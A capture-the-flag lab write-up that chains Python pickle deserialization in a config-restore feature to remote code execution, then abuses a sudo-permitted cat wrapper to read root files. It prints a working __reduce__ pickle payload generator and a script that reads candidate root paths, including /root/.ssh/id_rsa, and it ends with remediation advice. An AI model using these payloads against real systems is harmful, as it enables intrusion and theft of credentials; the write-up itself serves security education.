# ctf-writeups
# HackTheBox / Lab Writeup: Pickle Jar (Insecure Deserialization to Arbitrary File Read Privilege Escalation)

---

# Lab Writeup: Pickle Jar

**Difficulty:** Medium / Easy

**Key Vulnerabilities:** Python Insecure Deserialization (`pickle`), Sudo Misconfiguration (Arbitrary File Read via Wrapper Script)

---

## Overview

**Pickle Jar** is a capture-the-flag (CTF) style lab that explores the dangers of unsafe deserialization in Python applications, coupled with a classic local privilege escalation vector through an overly permissive `sudo` binary.

In this write-up, we'll break down how we went from an unauthenticated web feature to Remote Code Execution (RCE), pivoting as a service user, and ultimately abusing a backup utility script to read the root flag.

---

## Phase 1: Initial Reconnaissance & Insecure Deserialization (RCE)

The target application features a configuration restore mechanism that accepts serialized data. In Python applications, accepting untrusted data into `pickle.loads()` is a critical security risk because the `pickle` module allows arbitrary object instantiation and code execution during the deserialization process.

To test for Remote Code Execution (RCE), we crafted a malicious Python script using the `__reduce__` magic method, which Python invokes during unpickling to determine how to reconstruct an object.

We wrote a Python payload generator (`make_exploit.py`) to spawn a test command:

```python
import pickle

class RCE:
    def __reduce__(self):
        # Test command execution
        command = "__import__('os').popen('whoami').read()"
        return eval, (command,)

with open("exploit.pkl", "wb") as f:
    pickle.dump(RCE(), f)

```

After generating `exploit.pkl`, we uploaded it to the application's restore interface. The server successfully processed the pickle payload and returned the output: **`vault`**. We had achieved RCE!

---

## Phase 2: User Enumeration & User Flag Retrieval

With code execution confirmed as the `vault` user, we inspected the environment to locate the user-level flag.

Using a quick payload to read the home directory, we located the user flag at `/home/vault/flag-user.txt`.

---

## Phase 3: Privilege Escalation Audit (`sudo -l`)

To escalate our privileges from `vault` to `root`, the next logical step was to check what sudo rights our user possessed without a password.

We updated our exploit payload to execute `sudo -l`:

```python
class RCE:
    def __reduce__(self):
        command = "__import__('os').popen('sudo -l 2>/dev/null').read()"
        return eval, (command,)

```

Uploading the payload yielded a very promising result:

```text
User vault may run the following commands on the target:
    (root) NOPASSWD: /opt/vault/backup-util

```

The `vault` user was allowed to execute `/opt/vault/backup-util` as `root` without a password.

---

## Phase 4: Analyzing the Privileged Binary

Next, we inspected the contents of `/opt/vault/backup-util` using our RCE vector to see how it functioned:

```bash
#!/bin/bash
# DataVault Backup Utility v2.1
if [ -z "$1" ]; then
    echo "Usage: backup-util <config-file>"
    exit 1
fi
cat "$1"

```

### The Vulnerability

The script is a straightforward wrapper that takes an argument `$1` and passes it directly to `cat`. Because we can execute this script via `sudo` as `root`, **any file passed to it will be read with root privileges**, completely bypassing standard Linux file permissions. This effectively turns a simple backup utility into an unrestricted arbitrary file read vulnerability.

---

## Phase 5: Capturing the Root Flag

Since standard shell wildcards (`/root/*`) evaluated prematurely under our unprivileged shell context, we wrote a reliable base64-encoded Python scanner script via our pickle exploit to test potential flag paths using our new `sudo` capability:

```python
import subprocess

candidates = [
    '/root/root.txt', '/root/flag.txt', '/root/flag', '/root/root.flag',
    '/root/secret.txt', '/root/pass.txt', '/root/proof.txt', '/root/key.txt',
    '/root/.ssh/id_rsa', '/root/flag-root.txt'
]

for p in candidates:
    res = subprocess.run(['sudo', '/opt/vault/backup-util', p], capture_output=True, text=True)
    if 'No such file or directory' not in res.stderr:
        print(f"FILE: {p}")
        print(f"OUT: {res.stdout.strip()}")

```

### The Payoff

Upon uploading the updated payload, the script successfully hit the correct path:

* **File Path:** `/root/flag-root.txt`
* **Root Flag:** `24ad4f06-90ad-41a2-9741-fedfc20f6dc3`

---

## Key Takeaways & Remediation

1. **Never use `pickle` for untrusted data:** Python's `pickle` module is inherently unsafe for parsing data received from users or external sources. Safer serialization formats like JSON should always be used for configuration imports or data exchange.
2. **Principle of Least Privilege for Sudoers:** Granting `NOPASSWD` access to wrapper scripts that accept arbitrary file paths or pass arguments directly to powerful binaries (`cat`, `less`, `awk`, etc.) often leads to immediate privilege escalation. Sudo rules should be tightly scoped, validating inputs strictly against whitelists.
